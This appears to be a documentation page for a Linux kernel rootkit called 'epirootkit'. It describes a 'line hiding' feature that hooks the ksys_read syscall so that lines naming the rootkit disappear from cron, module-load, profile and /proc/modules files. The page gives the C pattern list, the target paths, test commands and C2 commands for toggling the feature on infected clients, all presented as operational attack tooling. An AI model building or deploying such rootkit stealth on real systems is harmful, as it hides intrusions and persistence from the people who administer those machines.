---
title: "Line Hiding"
description: "Hide rootkit lines from file contents using syscall interception"
icon: "edit"
date: "2025-05-30T00:00:00+01:00"
lastmod: "2025-05-30T00:00:00+01:00"
draft: false
toc: true
weight: 516
---

# Line Hiding

Hide lines containing rootkit patterns from file contents by intercepting read syscalls.

## Implementation

```c
static const char * const hide_line_patterns[] = {
    "epirootkit",
    "jules_est_bo_",
    "EpiRootkit",
    "modprobe epirootkit",
    "insmod epirootkit"
};

// Target directories
"/etc/cron.d/"
"/etc/modules-load.d/"
"/etc/profile.d/"
"/proc/modules"
```

Hooks `ksys_read` syscall and filters lines containing rootkit patterns from target files.

## Module Hiding Complement

**Module Hiding**: Removes module from kernel list (affects `lsmod`)  
**Line Hiding**: Filters `/proc/modules` content when read

Combined, they provide comprehensive module stealth.

## Testing

```bash
# Test with provided file
sudo cp test_line_hiding_epirootkit.txt /etc/cron.d/test_epirootkit
cat /etc/cron.d/test_epirootkit
# Result: 24 lines → ~9 lines (rootkit patterns filtered)

# Test module information
cat /proc/modules | grep epirootkit
# Output: (nothing when line hiding active)
```

## Control

### WebUI
Toggle via **[Configuration Panel](../../04-web-ui/features/panels/configuration-panel.md)**

### C2 Commands
```bash
enable-line-hiding Client-1    # Enable hiding
disable-line-hiding Client-1   # Disable hiding
status Client-1                # Check state
```